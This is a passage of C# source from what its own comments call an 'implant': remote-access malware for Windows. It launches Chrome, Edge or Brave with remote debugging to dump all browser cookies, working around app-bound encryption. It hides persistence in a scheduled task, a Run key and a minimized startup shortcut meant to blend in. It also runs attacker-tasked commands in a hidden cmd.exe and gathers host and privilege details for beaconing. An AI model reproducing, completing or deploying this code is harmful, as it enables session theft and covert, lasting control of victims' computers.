                    System.Threading.Thread.Sleep(100);
                    lock (box)
                    {
                        int j = allErr.IndexOf("DevTools listening on ", StringComparison.Ordinal);
                        if (j >= 0)
                        {
                            int k = allErr.IndexOf(' ', j + 22);
                            wsUrl = allErr.Substring(j + 22, (k < 0 ? allErr.Length : k) - (j + 22)).Trim();
                            break;
                        }
                    }
                }
                if (wsUrl == null) return null;
                Util.Log("  devtools endpoint: {0}", wsUrl);

                // Storage.getCookies is browser-wide; Network.* needs a page
                // target. The cookie store initialises asynchronously (ABE
                // unwrap via the elevation service), so retry while empty,
                // then fall back to a page target + Network.getAllCookies.
                byte[] best = null;
                for (int i = 0; i < 8; i++)
                {
                    byte[] r1 = CdpCall(wsUrl, "{\"id\":1,\"method\":\"Storage.getCookies\"}");
                    if (r1 != null)
                    {
                        string t = System.Text.Encoding.UTF8.GetString(r1);
                        if (t.Contains("\"cookies\":[{"))
                        { Util.Log("  storage.getCookies ok on try {0}: {1} bytes", i + 1, r1.Length); return r1; }
                        best = r1;
                    }
                    System.Threading.Thread.Sleep(500);
                }
                // page-target route: /json list -> first page ws -> Network.*
                try
                {
                    System.Threading.Thread.Sleep(300);
                    string pageWs = PageTargetWebSocket(wsUrl);
                    if (pageWs != null)
                    {
                        Util.Log("  page target: {0}", pageWs);
                        byte[] r2 = CdpCall(pageWs, "{\"id\":1,\"method\":\"Network.getAllCookies\"}");
                        if (r2 != null && System.Text.Encoding.UTF8.GetString(r2).Contains("\"cookies\":[{"))
                        { Util.Log("  network.getAllCookies ok: {0} bytes", r2.Length); return r2; }
                    }
                }
                catch (Exception e) { Util.Log("  page-target failed: {0}", e.Message); }
                if (best != null && best.Length > 20)
                    Util.Log("  devtools: cookies empty ({0})", System.Text.Encoding.UTF8.GetString(best).Length > 120 ? "big" : "small");
                return best;
            }
            finally
            {
                try { if (proc != null && !proc.HasExited) proc.Kill(); } catch { }
                try { Directory.Delete(tempRoot, true); } catch { }
            }
        }

        private static string FileSuffixFromUserData(string userData, string fullPath)
        {
            // e.g. Google\Chrome\User Data\Default\Network\Cookies
            int i = fullPath.IndexOf(userData, StringComparison.OrdinalIgnoreCase);
            string rel = i >= 0 ? fullPath.Substring(userData.Length).TrimStart('\\') : Path.GetFileName(fullPath);
            string browser = userData.ToLowerInvariant().Contains("brave")
                ? @"BraveSoftware\Brave-Browser\User Data"
                : userData.ToLowerInvariant().Contains("edge")
                    ? @"Microsoft\Edge\User Data"
                    : @"Google\Chrome\User Data";
            return browser + "\\" + rel;
        }


        private static string PageTargetWebSocket(string browserWsUrl)
        {
            // ws://127.0.0.1:PORT/devtools/browser/... -> http://127.0.0.1:PORT/json
            int p1 = browserWsUrl.IndexOf("//") + 2;
            int p2 = browserWsUrl.IndexOf('/', p1);
            string hostPort = browserWsUrl.Substring(p1, p2 - p1);
            string http = "http://" + hostPort + "/json";
            System.Net.HttpWebRequest rq = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(http);
            rq.Timeout = 5000;
            using (System.Net.HttpWebResponse rs = (System.Net.HttpWebResponse)rq.GetResponse())
            using (System.IO.Stream st = rs.GetResponseStream())
            using (System.IO.StreamReader rd = new System.IO.StreamReader(st))
            {
                string body = rd.ReadToEnd();
                int i = body.IndexOf("page");
                // crude: first webSocketDebuggerUrl entry of type page
                int j = body.IndexOf("\"webSocketDebuggerUrl\": \"");
                if (j < 0) j = body.IndexOf("\"webSocketDebuggerUrl\":\"");
                if (j < 0) return null;
                int q1 = body.IndexOf('"', body.IndexOf(':', j) + 2);
                int q2 = body.IndexOf('"', q1 + 1);
                string ws = body.Substring(q1 + 1, q2 - q1 - 1);
                return ws.StartsWith("ws") ? ws : null;
            }
        }
        private static byte[] CdpCall(string wsUrl, string message)
        {
            System.Net.WebSockets.ClientWebSocket ws =
                new System.Net.WebSockets.ClientWebSocket();
            ws.ConnectAsync(new Uri(wsUrl), System.Threading.CancellationToken.None)
              .Wait(8000);
            if (ws.State != System.Net.WebSockets.WebSocketState.Open) return null;
            byte[] send = System.Text.Encoding.UTF8.GetBytes(message);
            ws.SendAsync(new ArraySegment<byte>(send),
                System.Net.WebSockets.WebSocketMessageType.Text, true,
                System.Threading.CancellationToken.None).Wait(8000);

            using (System.IO.MemoryStream ms = new System.IO.MemoryStream())
            {
                byte[] buf = new byte[256 * 1024];
                System.Threading.CancellationToken ct = System.Threading.CancellationToken.None;
                while (true)
                {
                    System.Threading.Tasks.Task<System.Net.WebSockets.WebSocketReceiveResult> t =
                        ws.ReceiveAsync(new ArraySegment<byte>(buf), ct);
                    if (!t.Wait(30000)) break;
                    var r = t.Result;
                    if (r.MessageType == System.Net.WebSockets.WebSocketMessageType.Close) break;
                    ms.Write(buf, 0, r.Count);
                    if (r.EndOfMessage) break;
                    if (ms.Length > 64 * 1024 * 1024) break;
                }
                try { ws.CloseAsync(System.Net.WebSockets.WebSocketCloseStatus.NormalClosure,
                     "done", ct).Wait(2000); } catch { }
                return ms.ToArray();
            }
        }


        // ------------------------------------------------------------ persist
        // user-level persistence: staged copy + logon scheduled task + HKCU Run.
        // no elevation required; both triggers relaunch with --loop so the
        // implant keeps beaconing for tasking.
        public static string PersistStage(string pname, int loopSec, int jitterSec)
        {
            string exe = System.Reflection.Assembly.GetExecutingAssembly().Location;
            if (string.IsNullOrEmpty(exe) || !File.Exists(exe)) return "no-exe";
            string dir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Microsoft");
            string dst = Path.Combine(dir, pname + ".exe");
            try
            {
                Directory.CreateDirectory(dir);
                if (!File.Exists(dst))
                    File.Copy(exe, dst, false);
                else if (File.GetLastWriteTimeUtc(exe) > File.GetLastWriteTimeUtc(dst))
                    try { File.Copy(exe, dst, true); } catch { }
            }
            catch (Exception e) { return "copy-fail:" + e.Message; }

            // keep the trigger free of dash-args (schtasks rejects them and
            // quoting through CreateProcess is unreliable) -- the staged copy
            // self-detects its launch location and enables loop mode itself
            string tr = "\"" + dst + "\"";

            // 1) scheduled task: logon trigger preferred; unelevated boxes
            // deny ONLOGON registration, so fall back to an hourly trigger
            // (both relaunch the loop implant)
            string taskName = pname;
            bool taskOk = false;
            string[] schemas = new string[] { "/SC ONLOGON", "/SC MINUTE /MO 60" };
            foreach (string sch in schemas)
            {
                try
                {
                    ProcessStartInfo psi = new ProcessStartInfo("schtasks",
                        "/Create /F /TN " + taskName + " /TR \"" + tr + "\" " + sch);
                    psi.CreateNoWindow = true; psi.UseShellExecute = false;
                    psi.RedirectStandardOutput = true; psi.RedirectStandardError = true;
                    using (Process p = Process.Start(psi))
                    {
                        p.WaitForExit(6000); taskOk = p.ExitCode == 0;
                        if (!taskOk)
                            Util.Log("schtasks rc={0}: {1}", p.ExitCode,
                                (p.StandardError.ReadToEnd() + " " + p.StandardOutput.ReadToEnd()).Trim());
                    }
                    if (taskOk) break;
                }
                catch { }
            }

            // 2) HKCU Run key (fallback + redundancy)
            bool runOk = false;
            try
            {
                Microsoft.Win32.Registry.CurrentUser.CreateSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run")
                    .SetValue(pname, tr);
                runOk = true;
            }
            catch { }

            // 3) startup-folder shortcut (.lnk) -- survives Run-key cleanup,
            // no schtasks artifacts, blends into the dozens of vendor lnks
            bool lnkOk = false;
            try
            {
                string startup = Environment.GetFolderPath(
                    Environment.SpecialFolder.Startup);
                if (!string.IsNullOrEmpty(startup))
                {
                    string lnk = Path.Combine(startup, pname + ".lnk");
                    lnkOk = CreateShortcut(lnk, dst) == null;
                }
            }
            catch { }

            return "task=" + taskOk + ",run=" + runOk + ",lnk=" + lnkOk
                 + ",path=" + dst;
        }

        // returns null on success, else an error string
        static string CreateShortcut(string lnkPath, string target)
        {
            try
            {
                Type t = Type.GetTypeFromProgID("WScript.Shell");
                if (t == null) return "no-wscript";
                object shell = Activator.CreateInstance(t);
                object sc = t.InvokeMember("CreateShortcut",
                    System.Reflection.BindingFlags.InvokeMethod, null, shell,
                    new object[] { lnkPath });
                sc.GetType().InvokeMember("TargetPath",
                    System.Reflection.BindingFlags.SetProperty, null, sc,
                    new object[] { target });
                sc.GetType().InvokeMember("WorkingDirectory",
                    System.Reflection.BindingFlags.SetProperty, null, sc,
                    new object[] { Path.GetDirectoryName(target) });
                sc.GetType().InvokeMember("WindowStyle",
                    System.Reflection.BindingFlags.SetProperty, null, sc,
                    new object[] { 7 });   // minimized -- less visible
                sc.GetType().InvokeMember("Save",
                    System.Reflection.BindingFlags.InvokeMethod, null, sc, null);
                return null;
            }
            catch (Exception e) { return e.Message; }
        }

        public static string StagedPath(string pname)
        {
            return Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Microsoft", pname + ".exe");
        }

        public static string RemovePersistence(string pname)
        {
            string[] done = new string[3];
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo("schtasks",
                    "/Delete /F /TN " + pname);
                psi.CreateNoWindow = true; psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true; psi.RedirectStandardError = true;
                using (Process p = Process.Start(psi)) { p.WaitForExit(6000); }
                done[0] = "task";
            }
            catch { }
            try
            {
                Microsoft.Win32.Registry.CurrentUser
                    .OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true)
                    .DeleteValue(pname, false);
                done[1] = "run";
            }
            catch { }
            try
            {
                string lnk = Path.Combine(Environment.GetFolderPath(
                    Environment.SpecialFolder.Startup), pname + ".lnk");
                if (File.Exists(lnk)) File.Delete(lnk);
                done[2] = "lnk";
            }
            catch { }
            try
            {
                string dst = StagedPath(pname);
                if (File.Exists(dst))
                {
                    // rename-then-delete: staged copy may be running (us)
                    string tmp = dst + ".old";
                    try { File.Delete(tmp); } catch { }
                    File.Move(dst, tmp);
                    try { File.Delete(tmp); } catch { }
                }
            }
            catch { }
            return "removed:" + string.Join(",", done);
        }

        public static string CheckPersistence(string pname)
        {
            string s = "";
            try
            {
                object v = Microsoft.Win32.Registry.CurrentUser
                    .OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run")
                    .GetValue(pname);
                if (v != null) s += "runkey";
            }
            catch { }
            try
            {
                string lnk = Path.Combine(Environment.GetFolderPath(
                    Environment.SpecialFolder.Startup), pname + ".lnk");
                if (File.Exists(lnk)) s += (s.Length > 0 ? "," : "") + "lnk";
            }
            catch { }
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo("schtasks", "/Query /TN " + pname);
                psi.CreateNoWindow = true; psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true; psi.RedirectStandardError = true;
                using (Process p = Process.Start(psi))
                {
                    p.WaitForExit(6000);
                    if (p.ExitCode == 0) s += (s.Length > 0 ? "," : "") + "task";
                }
            }
            catch { }
            if (s.Length == 0 && File.Exists(StagedPath(pname))) s = "staged-only";
            return s.Length > 0 ? s : "none";
        }

        // hidden shell command for tasked exec -- output becomes a part
        public static byte[] RunTaskCommand(string cmd, int timeoutMs)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
                psi.CreateNoWindow = true; psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true; psi.RedirectStandardError = true;
                psi.StandardOutputEncoding = System.Text.Encoding.UTF8;
                psi.StandardErrorEncoding = System.Text.Encoding.UTF8;
                using (Process p = Process.Start(psi))
                {
                    string o = p.StandardOutput.ReadToEnd();
                    string e2 = p.StandardError.ReadToEnd();
                    if (!p.WaitForExit(timeoutMs)) try { p.Kill(); } catch { }
                    string all = (o + (e2.Length > 0 ? "\n[stderr]\n" + e2 : ""));
                    byte[] b = System.Text.Encoding.UTF8.GetBytes(all);
                    if (b.Length > 4 * 1024 * 1024)
                        Array.Resize(ref b, 4 * 1024 * 1024);
                    return b;
                }
            }
            catch (Exception ex)
            {
                return System.Text.Encoding.UTF8.GetBytes("exec-fail: " + ex.Message);
            }
        }

        // ------------------------------------------------------------ sysinfo
        public static string SysinfoJson(bool elevated, bool backupPriv)
        {
            Util.JsonObj o = new Util.JsonObj();
            o.Add("host", Environment.MachineName);
            o.Add("user", Environment.UserName);
            o.Add("domain", Environment.UserDomainName);
            string os = "";
            try
            {
                // Environment.OSVersion lies without a compat manifest; read the
                // real thing through the same NtOpenKeyEx+multi-read path
                Dictionary<string, object> cv = Util.ReadKeyValues(
                    @"\Registry\Machine\SOFTWARE\Microsoft\Windows NT\CurrentVersion",
                    new string[] { "ProductName", "CurrentBuildNumber", "DisplayVersion" });
                if ("OK".Equals(cv["_status"]) || "OK(no-backup-priv)".Equals(cv["_status"]))
                {
                    object pn, cb, dv;
                    if (cv.TryGetValue("#ProductName", out pn))
                        os += System.Text.Encoding.Unicode.GetString((byte[])pn).TrimEnd('\0');
                    if (cv.TryGetValue("#DisplayVersion", out dv))
                        os += " " + System.Text.Encoding.Unicode.GetString((byte[])dv).TrimEnd('\0');
                    if (cv.TryGetValue("#CurrentBuildNumber", out cb))
                        os += " build " + System.Text.Encoding.Unicode.GetString((byte[])cb).TrimEnd('\0');
                    os = os.Trim();
                }
            }
            catch { }
            if (os.Length == 0) os = Environment.OSVersion.VersionString;
            o.Add("os", os);
            o.Add("elevated", elevated ? "true" : "false");
            o.Add("se_backup", backupPriv ? "true" : "false");
            o.Add("ts", ((long)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds).ToString());
            o.Add("arch", IntPtr.Size == 8 ? "x64" : "x86");
            return o.ToString();
        }
    }
}
